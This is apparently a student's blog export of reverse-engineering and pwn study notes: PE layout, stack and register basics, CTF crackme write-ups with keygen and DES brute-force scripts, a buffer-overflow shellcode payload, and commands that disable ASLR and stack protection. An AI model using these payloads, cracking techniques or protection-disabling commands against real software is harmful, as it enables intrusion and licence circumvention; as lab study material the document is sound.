文件偏移是相对于文件开始处0字节的偏移，RVA则是相对于装载基地址0x00400000处的偏移。由于操作系统在进行装载时基本保持PE排列结果，所以文件偏移地址和RVA很大可能一致。 （如果有细微的差异的话，那就是由于文件数据的存放单位与内存数据存放单位不同造成的。) PE文件数据是按照磁盘数据标准存放，以0x200字节为基本单位进行组织，不足则以0x00填充，超过则分配下一个0X200继续使用 代码装入内存是按照内存数据存放，以0x1000字节为基本单位进行组织，不足全部补全，超过则分配下一个0x1000继续使用。 工具 Lord PE是一个查看PE文件并对之进行分析、修改的脱壳辅助软件。 如图就是这个工具的标准界面: 点击PE编辑器，随意加载如一个程序便可以查看相对信息： 点击区段进行节信息的查询：VOffset就是相对虚拟地址（RVA），ROffset是文件偏移地址。 在系统进程中，代码（.text节）将被加载到0x400000+0x11000=0x411000的虚拟地址中（装载基地址地址+RVA）。而在文件中，可以用二进制文件打开，看到对应的代码在0x10400位置。 通过这个工具可以很清楚了解我们所需要的信息（RVA，VA，文件偏移，装载基地址），对于漏洞的分析是一个很好的辅助。]]></content>
      <categories>
        <category>reverse</category>
      </categories>
      <tags>
        <tag>reverse</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[堆栈及汇编基础]]></title>
    <url>%2F2017%2F07%2F04%2F%E5%A0%86%E6%A0%88%E5%8F%8A%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%2F</url>
    <content type="text"><![CDATA[暑假生活开始，学习的好时间，今天就先重温一下堆栈的基础，好好巩固一下。 内存区域 不同的操作系统，一个进程被分配进入的内存区域都会不同，但是无论是哪个系统，进程使用的内存按照功都同样大致分为四种： 代码区:这个区域储存装入的要被执行的二进制机器代码，处理器会到这个区域获取指令并进行执行。 数据区:这个区域储存程序运行过程中出现的全局变量，局部变量等。 堆区:进程需要运行的时候，可以向这个区域申请空间，当运行结束之后空间将归还堆区，这就是堆的特点，动态分配和回收空间。 栈区:用于动态存储函数之间的调用关系，从而保证调用函数后能回到主函数中继续执行程序。 Windows下高级语言写出一个程序经过编译链接之后便可以生成一个可执行文件，这个可执行文件被装载运行之后便成为了所谓的进程。 每一个可执行程序中都包含着二进制级别的机器代码，这些代码将会被装载入代码区，处理器会一条一条的读取并运行。如果代码中有开辟动态内存的请求，则会在内存堆区中分配一个大小适合的区域给代码使用；当函数调用发生之后，栈中便会有栈帧自动保存函数的调用关系信息，以便于函数调用结束能回到主函数继续执行程序。 栈帧:C语言中，栈中的栈帧对应着未运行完成的函数，并且是一一对应，栈帧从逻辑上理解就是一个函数执行的环境:函数的参数，函数的变量，函数的返回地址等。在函数栈帧中，一般包含如下几类重要信息。 局部变量:为函数局部变量开辟内存空间。 栈帧状态值:保存前栈帧的顶部和底部，用于在本栈弹出后可以恢复上一个栈帧。 函数返回地址:保存当前函数调用前的“断点”信息，也就是函数调用前的指令的位置，以便在函数返回时能回到调用的代码区中继续执行命令。 函数调用 假设一个如下的简单函数： int func_B(int a,int b) { int i,j; i = a + b; j = a - b; return i * j; } int func_A(int c,int d) { int t; t = func_B(c,d)+c; return t; } int main() { int main; main=func_A(4,3); return main; } 函数在进行函数调用在栈中的操作如下： 在main函数调用func_A的时候，首先在自己的栈帧中压入函数返回地址，然后为func_A创建新的栈帧并压入栈 在func_A调用func_B的时候，同样先在自己的栈帧中压入函数返回地址，然后为func_B创建新的栈帧并压入栈 在func_B返回时候，func_B专属的栈帧呗弹出统栈，这样就露出func_A的返回地址，这样就直接执行这个地址返回func_A中继续执行 在func_A返回时候，func_A专属的栈帧呗弹出统栈，这样就露出main的返回地址，这样就直接执行这个地址返回main中继续执行。 注意：在实际运行中，main函数并不是第一个被调用的函数，程序被装入内存前还有一些其他的操作。 函数调用本身的大体步骤如下：(这个对于后面pwn的学习中payload的构造有关键作用) 参数入栈：将参数从右向左依次压入系统栈中。 返回地址入栈：将当前代码去调用指令的下一条指令地址压入栈中，供函数返回时继续执行。 代码区跳转：处理器从当前代码区跳转到被调用的入口处。 栈帧调整：(1)保存当前栈帧的状态值，以备后面恢复本栈帧时使用（EBP入栈）。(2)将当前栈帧切换到新栈帧(将ESP值装入EBP，更新栈帧底部。) 汇编语言 在汇编语言当中，主要是四类寄存器。 4个数据寄存器（EAX，EBX，ECX，EDX）。 2个变址寄存器（ESI，EDI）、2个指针寄存器（ESP、EBP） 6个端寄存器（ES、CS、SS、DS、FS、GS） 1个指令指针寄存器（EIP）、一个标志寄存器（EFlags） 1.寄存器 (1). 数据寄存器 数据寄存器主要用来保存操作数以及运算结果，这样就便于节省读取操作数的时间。 32位CPU4个32位通用的寄存器EAX，EBX，ECX，EDX。他们只会对低16为数据进行存储，不会影响高16位的数据。这低16位的寄存器又被称为AX、BX、DC、CX。与先前的CPU寄存器相一致。 EAX：累加寄存器，用于加减乘除的操作，也用于存储函数的返回值。使用频率非常高。 EBX：基址寄存器，作为存储器指针来用。 ECX：计数寄存器，在循环和字符串操作时，用他来计数；在位操作是，要用CL来指明移位的位数。 EDX：数据寄存器，在进行乘除运算时，它可作为默认的操作数进行操作。 (2). 变址寄存器 32位CPU有两个32位通用的变址寄存器ESI和EDI，与前者一样，只对低16位数据进程存取。 ESI：在内存操作指令中作为源地址指针使用，处理字符串时候通常指向源串。 EDI：在内存操作指令中作为目的地址指针使用，处理字符串时候通常指向目标串。 (3). 指针寄存器EBP和ESP就是指针寄存器，主要用于存放堆栈内储存单元的偏移量，用他们可以实现多种寄存器储存操作数的寻址方式。 EBP: 基地址寄存器，内存放一个指针永远指向系统栈的最上面一个栈帧的底部。通过它减去一定偏移量对栈中元素进行访问。 ESP：栈指针寄存器，内存放一个指针永远指向系统栈的最上面一个栈帧的顶部。 (4). 段寄存器段寄存器是根据内存分段的模式而设置的。内存单元的物理地址由段寄存器的值和一个偏移量组合而成的，这样可用两个较少位数的值组合成一个可访问的较大物理空间的内存地址。 CS（Code）: 代码段寄存器，其值为代码段的段值 DS（Date）: 数据段寄存器，其值为数据段的段值 ES（Extra）: 附加段寄存器，其值为附加数据段的段值 SS（Strack）:堆栈段寄存器，其值为堆栈段的段值 FS（Flag）: 标志段寄存器，其值为附加数据段的段值 GS（Global）:全局段寄存器，其值为附加数据段的段值 8086 CPU依赖其内部的四个段寄存器实现寻址1M字节物理地址空间。8086把1M字节地址空间划分为若干逻辑段，当前使用段的段值存放在段寄存器中。由段寄存器和段内偏移形成20位地址。 汇编中表示： 段值：偏移 计算方法： 物理地址 = 段值×16 + 偏移 举个 用16进制表示的逻辑地址1234：3456H所对应的存储单元的物理地址为15796H。 (5). 指令指针寄存器 EIP：存放个下一次将要执行的指令在代码段中的偏移量。 (6). 标志寄存器8086 CPU中有一个16位的标志寄存器，包含了9个标志，主要用于反映处理器的状态和运算结果的某些特征。 9个标志寄存器可以分为两组，第一组6个标志寄存器主要受加减运算和逻辑运算结果的影响，称为运算结果标志，第二组标志不受运算结果的影响，称为状态控制标志。 1. 进位标志CF(Carry Flag) 进位标志CF主要用来反映运算是否产生进位或借位。如果运算结果的最高位产生了一个进位或借位，那么，其值为1，否则其值为0。 2. 奇偶标志PF(Parity Flag) 奇偶标志PF用于反映运算结果中“1”的个数的奇偶性。如果“1”的个数为偶数，则PF的值1，否则其值为0 3. 辅助进位标志AF(Auxiliary Carry Flag) 在发生下列情况时，辅助进位标志AF的值被置为1，否则其值为0： (1)、在字操作时，发生低字节向高字节进位或借位时； (2)、在字节操作时，发生低4位向高4位进位或借位时。 4. 零标志ZF(Zero Flag) 零标志ZF用来反映运算结果是否为0。如果运算结果为0，则其值为1，否则其值为0。在判断运算结果是否为0时，可使用此标志位 5. 符号标志SF(Sign Flag) 符号标志SF用来反映运算结果的符号位，它与运算结果的最高位相同。在微机系统中，有符号数采用补码表示法，所以，SF也就反映运算结果的正负号。运算结果为正数时，SF的值为0，否则其值为1 6. 溢出标志OF(Overflow Flag) 溢出标志OF用于反映有符号数加减运算所得结果是否溢出。如果运算结果超过当前运算位数所能表示的范围，则称为溢出，OF的值被置为1，否则，OF的值被清为0（“溢出”和“进位”是两个不同含义的概念） 7. 中断允许标志IF(Interrupt-enable Flag) 中断允许标志IF是用来决定CPU是否响应CPU外部的可屏蔽中断发出的中断请求。但不管该标志为何值，CPU都必须响应CPU外部的不可屏蔽中断所发出的中断请求，以及CPU内部产生的中断请求。具体规定如下 (1)、当IF=1时，CPU可以响应CPU外部的可屏蔽中断发出的中断请求； (2)、当IF=0时，CPU不响应CPU外部的可屏蔽中断发出的中断请求 8. 追踪标志TF(Trap Flag) 当追踪标志TF被置为1时，CPU进入单步执行方式，即每执行一条指令，产生一个单步中断请求。这种方式主要用于程序的调试。 9. 方向标志DF(Direction Flag) 方向标志DF用来决定在串操作指令执行时有关指针寄存器发生调整的方向。具体规定在第5.2.11节——字符串操作指令——中给出。在微机的指令系统中，还提供了专门的指令来改变标志位DF的值 2. 主要指令 汇编中的指令可以参照这个网址进行学习（也涉及了上面的寄存器知识点）： http://www.freebuf.com/news/others/86147.html 在参加夏令营跟着读汇编呢也遇到了一些难以理解的内容： movsb：即字符串传送指令，这条指令按字节传送数据。通过SI和DI这两个寄存器控制字符串的源地址和目标地址，比如DS:SI这段地址的N个字节复制到ES:DI指向的地址，复制后DS:SI的内容保持不变。 cld:（CLear Direction flag）则是清方向标志位，也就是使DF的值为0，在执行串操作时，使地址按递增的方式变化，这样便于调整相关段的的当前指针。这条指令与STD（SeT Direction flag）的执行结果相反，即置DF的值为1。 Rep:指令就是“重复”的意思，术语叫做“重复前缀指令”，因为既然是传递字符串，则不可能一个字（节）一个字（节）地传送，所以需要有一个寄存器来控制串长度。这个寄存器就是CX，指令每次执行前都会判断CX的值是否为0（为0结束重复，不为0，CX的值减1），以此来设定重复执行的次数。因此设置好CX的值之后就可以用REP MOVSB了。]]></content>
      <categories>
        <category>reverse</category>
      </categories>
      <tags>
        <tag>堆栈及汇编基础</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[定一个小目标]]></title>
    <url>%2F2017%2F06%2F26%2F%E5%AE%9A%E4%B8%80%E4%B8%AA%E5%B0%8F%E7%9B%AE%E6%A0%87%2F</url>
    <content type="text"><![CDATA[这是一个小目标。 今天，算是我的blog的第二个生日吧，在2016第一次搭建成功之后便在没有怎么管理过它，只是僵硬的往上传一些做题的writeup，那为什么还要搭建它，直接做一个笔记不就好了? 上周的聚会中和已经工作的学长作了一次深入的交谈，让我了解到了blog的重要，好好对待，它也许能助你成功，不好好对待它也就是一个高级一点的笔记本，恐怕也只有你自己能够进行阅读，毫无意义。 从前天开始对我的blog进行了主题修改，对一些小功能进行了完善，自行添加了一些小的插曲，自此，要求不高，多多上传一些自己的见解，把blog利用起来，学习之路还要继续向前。]]></content>
      <categories>
        <category>others</category>
      </categories>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[practice 8之PEiD插件]]></title>
    <url>%2F2017%2F02%2F16%2Fpractice-8%E4%B9%8BPEiD%E6%8F%92%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[第八题 PEiD有一个叫做Krypto ANALyzer的插件，使用这个插件可以对程序进行扫描，通过特征匹配来识别程序内部可能用到的一些标准算法。 先看题目，随便输入就会报错。 利用IDA找到关键点这些烂熟于心的步骤就不再提了，对下面这段关键算法分析完了之后发现关键函数是sub_401510,但是点开这个函数，真的是好长的一大串， 用PEid的插件进行分析，提示这个程序用了 MD5算法。 根据提示地址，在IDA反汇编指示图按下G，输入00401E5C,就会自动跳转到函数代码中 可以从sub_401D10回溯到sub_4026F0，继续通过交叉引用往上回溯，依次为sub_4027B0、sub_401C00、sub_401BB0、sub_401510，而sub_401510就是我们在实验步骤一种为一个暂时不理解的函数。那么我们可以猜测sub_401510这个函数就是用来计算用户名的MD5值的，我们可以通过OD动态调试来验证我们的想法。 通过阅读IDA中的反汇编代码，我们知道在00401752处调用了sub_401510这个函数， OK使用OD载入在00401752设置断点，输入test，直接跳转到执行sub_401510，看到eax寄存器值正好是test的MD5值 这里说明插件判别是正确的正好使用python写一个MD5的注册机 #!usr/bin/python #-*- coding:utf-8 -*- import hashlib while True: username = raw_input(&quot;input username:&quot;) md5 = hashlib.md5(username).hexdigest().upper() serial = md5[::-1] # 翻转字符串 print &quot;serial: %s&quot; % serial]]></content>
      <categories>
        <category>reverse practice</category>
      </categories>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[practice 7之行为分析]]></title>
    <url>%2F2017%2F02%2F14%2Fpractice-7%E4%B9%8B%E8%A1%8C%E4%B8%BA%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[第七题 看完教程发现这题写起来很简单，但是我们以前是没有接触过（病毒分析）而且通过这题我知道了一个在线的行为分析工具，人称，在线沙箱： 网上有许多公开的在线沙箱，使用这些沙箱提供的服务，我们可以方便的观察一个程序的详细行为报告，进而判断一个程序大致的内部逻辑。 病毒是个img文件，无法执行的文件，可以使用7zip打开如图，看看文件内部隐藏了些什么。 打开会发现如图文件：一个游戏这时便出现误区，难道是玩游戏过关吗？看下面的文件，用记事本打开，是提示，游戏有后门 打开游戏最上面一行亮了，我去。 继续用7zip试着打开，果然里面还有东西，我们发现里面有三个文件，分别为1.vbs、1.exe、2.exe，如下图所示：第二个是游戏第一个打开知识闪过了指令框，猜测这可能就是所谓的“病毒文件” 用在线沙箱分析来加快我们的分析流程，看看1.exe都有哪些行为特征。 打开金山火眼https://fireeye.ijinshan.com/，注册一个账号并激活，点击“分析文件”上传1.exe进行分析，等待一段时间就可以看到分析报告了。 从分析报告中我们可以看出，1.exe释放了一个test.txt文件到当前目录，而且把test.txt的文件属性设置为系统和隐藏，因此我们看不到文件夹里面多了一个txt文件。现在使用记事本打开这个test.txt文件，文件内容为（WdubQ4IGEzAG54NfATJTNhI4TLIvPvENyTLLWb3YCNBeK5wad5XCgrSQNOih1F），如图所示： 最够根据提示信息把所得到的字符串 使用MD5计算工具，算出这个字符串的16位MD5值，为ba3c34ec7cd9c086，这就是我们要找的flag了，如图所示：]]></content>
      <categories>
        <category>reverse practice</category>
      </categories>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[practice 6之算法夹杂]]></title>
    <url>%2F2017%2F02%2F13%2Fpractice-6%E4%B9%8B%E7%AE%97%E6%B3%95%E5%A4%B9%E6%9D%82%2F</url>
    <content type="text"><![CDATA[第六题 之前没做出来的一道题目，各种密码学的夹杂，看到很多.so库估计当时也没啥想法了很明了，对输入进行检验，过了就输出right，错了就输出wrong，分析一下check_401510这个函数。先是判断字符范围，ASCII码不能超过90。 然后取输入的前5个字符，作md5加密，如下三个函数就是实现了md5算法 接下来就是用前五个字符的md5值的前8字节作为DES算法的key，并且采用ECB模式分组加密。 然后就是对DES加密后的结果作base64变换，v9是DES加密结果，v21保存base64结果。 最后就是和check数组比较，check数组内容即是：‘OSHzTJ4pwFgRG6eS6y3xVOOEGcbE5rzwqTs7VCK6ACQLuiTamZpXcQ==’ 所以采用爆破的方式去得到flag，设flag前五位为temp，并且用其md5值前8字节作为DES算法的key，当解密出来的flag前五位和temp相等时，即为flag。脚本如下：（参考的大神writeup） import pyDes import base64 import hashlib import string check = &quot;OSHzTJ4pwFgRG6eS6y3xVOOEGcbE5rzwqTs7VCK6ACQLuiTamZpXcQ==&quot; miwen = base64.b64decode(check) count = 0 for i in string.uppercase + string.digits: for j in string.uppercase + string.digits: for k in string.uppercase + string.digits: for m in string.uppercase + string.digits: for n in string.uppercase + string.digits: count = count + 1 tmp = i+j+k+m+n md5_tmp = hashlib.md5(tmp).hexdigest() key = md5_tmp[0:16].decode(&quot;hex&quot;) result = pyDes.des(key) y = result.decrypt(miwen[:8]) if y[0:5] == tmp: print y if count % 10000 == 0: print count 这道题目主要就是各种密码算法的交杂，在代码的分析上比较困难，即使参照writeup也很难掌握，后面还得好好在琢磨琢磨]]></content>
      <categories>
        <category>reverse practice</category>
      </categories>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[practice 5之万能断点]]></title>
    <url>%2F2017%2F02%2F12%2Fpractice-5%E4%B9%8B%E4%B8%87%E8%83%BD%E6%96%AD%E7%82%B9%2F</url>
    <content type="text"><![CDATA[第五个只能算得上是学习一个新技能–万能断点之前没听过。 给的是一个未注册版本的软件，题目要求将其注册 乱填只能是出错误 放入IDA用运行，然后点击输入注册码，报错之后暂停OD调试 如下图查看user3模块 转到这个模块下之后便开始下万能断点；查找二进制字符串（crtl+B）,然后在弹出的框内输入万能断点并将跳转处设为断点 重新载入程序，依旧输入错误注册码（由于万能断点，在运行到弹出输入界面时，中途会多次暂停）输入结束之后便可以按F8单步步过。直到堆栈窗口出现正确的注册码 输入检验注册成功： 万能断点：“F3 A5 8B C8 83 E1 03 F3 A4 E8”]]></content>
      <categories>
        <category>reverse practice</category>
      </categories>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[practice-4之IDA用法]]></title>
    <url>%2F2017%2F02%2F12%2Fpractice-4%E4%B9%8BIDA%E7%94%A8%E6%B3%95%2F</url>
    <content type="text"><![CDATA[第四题 打开是这样的，看English了解掷骰子，输入任意数字（3），我发现第一次输入三进行到下一步，但是退出重启之后在输入3则为错的，所以想要在9^5种可能中猜出随机变化的数字几率，除非脸白。，还是分析源程序得到答案吧 用IDA打开程序。进入之后shift+f12查找关键字符串。 找到“Nice job.here is the flag”,双击跳转过去。会看到WinMain函数（常见的C++程序函数）直接反汇编 然后就是分析代码过程了 v56 = std::operator&lt;&lt;]]></content>
      <categories>
        <category>reverse practice</category>
      </categories>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[practice-3之pyo学习]]></title>
    <url>%2F2017%2F02%2F10%2Fpractice-3%E4%B9%8Bpyo%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[第三题： 下载下来是个这个名字的题目，也不像之前遇到的后缀里虽然杂乱也存在正确后缀的，于是想到一个格式分析工具，拖进去看看是一个pyo格式文件，回想一下以前也没见过这种格式的题目，百度一下知道这种格式其实与pyc一样，都是将py程序编译成可执行程序。 知道格式之后先改后缀，然后转换格式再用python2.7下的反编译工具unompyle把这个题目的源代码弄出来 #!usr/bin/python #-*- coding:utf-8 -*- import sys lookup = [196, 153, 149, 206, 17, 221, 10, 217, 167, 18, 36, 135, 103, 61, 111, 31, 92, 152, 21, 228, 105, 191, 173, 41, 2, 245, 23, 144, 1, 246, 89, 178, 182, 119, 38, 85, 48, 226, 165, 241, 166, 214, 71, 90, 151, 3, 109, 169, 150, 224, 69, 156, 158, 57, 181, 29, 200, 37, 51, 252, 227, 93, 65, 82, 66, 80, 170, 77, 49, 177, 81, 94, 202, 107, 25, 73, 148, 98, 129, 231, 212, 14, 84, 121, 174, 171, 64, 180, 233, 74, 140, 242, 75, 104, 253, 44, 39, 87, 86, 27, 68, 22, 55, 76, 35, 248, 96, 5, 56, 20, 161, 213, 238, 220, 72, 100, 247, 8, 63, 249, 145, 243, 155, 222, 122, 32, 43, 186, 0, 102, 216, 126, 15, 42, 115, 138, 240, 147, 229, 204, 117, 223, 141, 159, 131, 232, 124, 254, 60, 116, 46, 113, 79, 16, 128, 6, 251, 40, 205, 137, 199, 83, 54, 188, 19, 184, 201, 110, 255, 26, 91, 211, 132, 160, 168, 154, 185, 183, 244, 78, 33, 123, 28, 59, 12, 210, 218, 47, 163, 215, 209, 108, 235, 237, 118, 101, 24, 234, 106, 143, 88, 9, 136, 95, 30, 193, 176, 225, 198, 197, 194, 239, 134, 162, 192, 11, 70, 58, 187, 50, 67, 236, 230, 13, 99, 190, 208, 207, 7, 53, 219, 203, 62, 114, 127, 125, 164, 179, 175, 112, 172, 250, 133, 130, 52, 189, 97, 146, 34, 157, 120, 195, 45, 4, 142, 139] pwda = [188, 155, 11, 58, 251, 208, 204, 202, 150, 120, 206, 237, 114, 92, 126, 6, 42] pwdb = [53, 222, 230, 35, 67, 248, 226, 216, 17, 209, 32, 2, 181, 200, 171, 60, 108] flag = raw_input(&apos;Input your Key:&apos;).strip() if len(flag) != 17: print &apos;Wrong Key!!&apos; sys.exit(1) flag = flag[::-1] for i in range(0, len(flag)): if ord(flag[i]) + pwda[i] &amp; 255 != lookup[i + pwdb[i]]: print &apos;Wrong Key!!&apos; sys.exit(1) print &apos;Congratulations!!&apos; 虽然长关键是最后哪儿的处理，在最后做一个修改就可以了，第一次想的方法是根据以前做题的经验进行爆破的，有碰巧的嫌疑：前面关键数据不变把最后的数据进行改变如下图 最后跑出来的结果： 其实这样子添加abcde等字符的方法有凑巧之嫌。万一有#之类的问题该如何，第一次改就漏掉了‘’不是猜测真的得不出17位把‘’给落掉了，随意中途也突然想了一个方法，直接一个for循环在0到128之间进行爆破并用组进行保存，最后直接通过ord()函数进行转换就能得到最后的flag]]></content>
      <categories>
        <category>reverse practice</category>
      </categories>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[practice-2之汇编]]></title>
    <url>%2F2017%2F02%2F10%2Fpractice-2%E4%B9%8B%E6%B1%87%E7%BC%96%2F</url>
    <content type="text"><![CDATA[一道ELFx64的题目，只能用IDA载入，找到main函数，F5得到代码 看上面两个图，代码可读性果然不太好。前面print的一大堆应该是文件的提示字符串输入重点是后面的while循环以及那个if语句，直接看到if可以发现flag的最后几个变量必须是0，8，2，3这个不难看出来， 试着看汇编把，看总览图，也不知道是不是这个技巧，看看剪头分布能推断出哪一段是循环语句所在之处，if判断之处啥的 跟着C语言看看汇编语言吧 进过上述分析可以知道var_40应该使我们输入的结果，所以必须必须知道var_C0的数据跳到相应位置 是空的，再回到代码找找，会发现这样子一串操作 刚好17个数字，所以说var_i[i] = ((var_C0[i]-1)+(var_C0[i]-1)&gt;&gt;0x1f)&gt;&gt;1 好的，python写脚本： #!usr/bin/python #-*- coding:utf-8 -*- key = [0x0EF, 0x0C7, 0x0E9, 0x0CD, 0x0F7, 0x08B, 0x0D9, 0x08D, 0x0BF, 0x0D9, 0x0DD, 0x0B1, 0x0BF, 0x087, 0x0D7, 0x0DB, 0x0BF ] flag = [] for i in range(0,17): ch = ((key[i]-1)+((key[i]-1)&gt;&gt;0x1f))&gt;&gt;1; flag.append(chr(ch)) print(flag) print(&apos;0823}&apos;) 最后结果：]]></content>
      <categories>
        <category>reverse practice</category>
      </categories>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[8道Pwn基础练习所得]]></title>
    <url>%2F2017%2F02%2F09%2F8%E9%81%93Pwn%E5%9F%BA%E7%A1%80%E7%BB%83%E4%B9%A0%E6%89%80%E5%BE%97%2F</url>
    <content type="text"><![CDATA[刚开始做pwn的题目，从基础开始咯，所以在合天上先总结一些学到的指令。（基础gdb就不多说了）{!:在数据填充的时候不可以用换行符号进行填充} 一、Pwn基础练习1查询pwn程序的c语言源代码 cat pwn.c 直接将64个A和一个B通过管道输入到程序中 python -c “print ‘A’*64+’B’” | ./pwn 二、Pwn基础练习2 Linux的xargs命令可以将输入数据当做命令行参数传给指定的程序。将AAA BBB CCC传给指定的test指令然后进行输出。（用户函数中没有获取函数值语句的程序当中） python -c “print ‘AAA BBB CCC’” | xargs ./test 以字节为单位查看内存中0x34333231的表示（其中/4xb用于控制输出格式，4表示4个长度单位，x表示以16进制方式显示，b表示单位为字节） x /4xb $esp+0x5C 三、Pwn基础练习3Python基础知识 Python的os模块提供创建子进程以及修改环境变量的函数，其中os.system函数可以创建一个子进程，且子进程会继承父进程的环境变量参数信息；os.putenv可以修改进程的环境变量参数信息。 运行脚本就可以把这题pwn成功 import os defpwn(): os.putenv(“HEETIAN”,”A”*64+”\x0a\x0d\x0a\x0d”) os.system(“./pwn3”) if name ==”main“: pwn() 在shell输入下面指令为子进程添加一个新的环境变量（除了通过export添加环境变量以外，我们还可以通过函数getenv、putenv、setenv等对环境变量进行操作。） export testenv=”Hello_World” Linux Shell中，可以使用$()或者两个反引号（）来包裹一条shell命令，并返回shell命令的执行结果。 比如执行export testenv2=python -c “print ‘A’*20”`命令后，再执行./env可以看到有一个名为testenv2的环境变量，其值为20个A。 export testenv2=python -c &quot;print &#39;A&#39;*20&quot; 四、Pwn基础练习4一、objdump使用 使用objdump工具可以查看一个目标文件的许多内部信息，objdump有许多可选的参数选项，通过控制这些参数选项可以输出不同的文件信息。 使用下面这条指令可以看到关于pwn4程序的反汇编指令列表，其中-d选项表示进行反汇编操作 objdump -d pwn4 五、Pwn基础练习51、C语言函数调用约定通过压栈实现参数传递，且参数压栈顺序为从右往左2、查询esp寄存器中的值 i r $esp 六、Pwn基础练习6二、Shellcode Shellcode指缓冲区溢出攻击中植入进程的恶意代码，这段代码可以弹出一个消息框，也可以在目标机器上打开一个监听端口，甚至是删除目标机器上的重要文件等。 Shellcode通常需要使用汇编语言进行开发，并转换成二进制机器码，其内容和长度经常还会受到很多实际条件的限制，因此开发Shellcode通常都是非常困难的。在实际场景中，我们通常使用Metasploit这个工具来定制各种功能的Shellcode，当然也可以去网上查找一些现有的Shellcode进行测试，通常在shell-storm以及exploit-db等网站上都能找到一些比较成熟和稳定的shellcode，网址为： http://shell-storm.org/shellcode/ http://www.exploit-db.com/shellcode/ 具有复杂功能的Shellcode无法作用于不同类型的操作系统（如Windows、Linux）将pwn6.py 脚本写到test文件里面 然后把test文本拖到pwn6程序里面运行。 python pwn6.py test./pwn6 &lt; test shellcod的python脚本 shellcode = (“\xeb\x12\x31\xc9\x5e\x56\x5f\xb1\x15\x8a\x06\xfe” +“\xc8\x88\x06\x46\xe2\xf7\xff\xe7\xe8\xe9\xff\xff” +“\xff\x32\xc1\x32\xca\x52\x69\x30\x74\x69\x01\x69” +“\x30\x63\x6a\x6f\x8a\xe4\xb1\x0c\xce\x81”) print ‘A’*76 + ‘\xd0\xd6\xff\xff’ + shellcode 七、Pwn基础练习7一、__builtin_return_address函数 builtin_return_address函数接收一个参数，可以是0,1,2等。builtin_return_address(0)返回当前函数的返回地址，如果参数增大1，那么就往上走一层获取主调函数的返回地址. 二、理解多层跳转 retn指令从栈顶弹出一个数据并赋值给EIP寄存器，程序继续执行时就相当于跳转到这个地址去执行代码了。 如果我们将返回地址覆盖为一条retn指令的地址，那么就又可以执行一条retn指令了，相当于再在栈顶弹出一个数据赋值给EIP寄存器。 三、函数作用 fflush()用于清空文件缓冲区，如果文件是以写的方式打开 的，则把缓冲区内容写入文件。其原型为： int fflush(FILE* stream); 【参数】stream为文件指针。 【返回值】成功返回0，失败返回EOF，错误代码存于errno 中。指定的流没有缓冲区或者只读打开时也返回0值。 fflush()也可用于标准输入（stdin）和标准输出（stdout），用来清空标准输入输出缓冲区。 stdin 是 standard input 的缩写，即标准输入，一般是指键盘；标准输入缓冲区即是用来暂存从键盘输入的内容的缓冲区。 stdout 是 standard output 的缩写，即标准输出，一般是指显示器；标准输出缓冲区即是用来暂存将要显示的内容的缓冲区。 八、Pwn基础练习8二、strdup函数 strdup可以用于复制一个字符串，我们通常使用字符串时会使用strcpy，这要求已经定义好了一个接收缓冲区。而strdup只接受一个参数，也就是要复制的字符串的地址，strdup()会先用maolloc()配置与参数字符串相同大小的的空间，然后将参数字符串的内容复制到该内存地址，然后把该地址返回。strdup返回的地址最后可以利用free()来释放。 三、grep命令 当输出信息非常多的时候，我们很难快速找到我们感兴趣的信息。使用grep命令可以对匹配特定正则表达式的文本进行搜索，并只输出匹配的行或文本。 我们可以使用管道将一个程序的输出当做grep的输入数据，grep会根据给定的正则表达式参数对输入数据进行过滤。 对于grep的参数需要注意这样一个问题：当参数中存在空格时需要用双引号将参数包裹起来，此外，是正则表达式里面的通配符，如果要查找，需要使用反斜杠进行转移，即*。]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一步一步学ROP之x86篇]]></title>
    <url>%2F2017%2F02%2F08%2F%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%AD%A6ROP%E4%B9%8Bx86%E7%AF%87%2F</url>
    <content type="text"><![CDATA[根据寒假计划的第三计划，是该学习rop了。下面是学习rop之linux_x86篇的学习笔记以及总结。 语知其事，先解其意。rop是什么？ 一、ROP ROP的全称为Return-oriented programming（返回导向编程），这一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等） 了解了其意思，下面就是学习内容 第一、Control Flow Hijack 程序流劫持这是一个较为常见的程序流劫持，其宗旨就是栈溢出，格式化字符串攻击和栈溢出。通过这个手段，攻击者可以做的就是控制PC指针然后执行目标代码，想要应对这个攻击，在linux系统下也是有保护机制存在的： 1、DEP(堆栈不可执行)：这也就是gcc编译器gs验证码机制，这是专门防止缓冲区溢出而采取的保护措施，具体方法是gcc首先在缓冲区被写入之前在buf的结束地址之后返回地址之前放入随机的gs验证码，并在缓冲区写入操作结束时检验该值。通常缓冲区溢出会从低地址到高地址覆写内存，所以如果要覆写返回地址，则需要覆写该gs验证码。这样就可以通过比较写入前和写入后gs验证码的数据，判断是否产生溢出。 此机制的关闭方法是：在gcc编译时采用-fno-stack-protector选项。 2、ASLR(内存地址随机化)：在Ubuntu个其他Linux内核的系统中，目前都采用的内存地址随机话机制，这将会使得猜测具体的内存地址变得十分困难。 此机制的关闭方法是：sysctl -w kernel.randomize_va_space=0 3、Stack Protector(栈保护)：对于Federal系统，默认会执行可执行程序的屏蔽保护机制，该机制不允许执行存储在栈中的代码，这会使得缓冲区溢出攻击变得无效。而Ubuntu系统中默认没有采用这种机制。 此机制的关闭方法是：sysctl –w kernel.exec-shield=0 gcc下：-z execstack 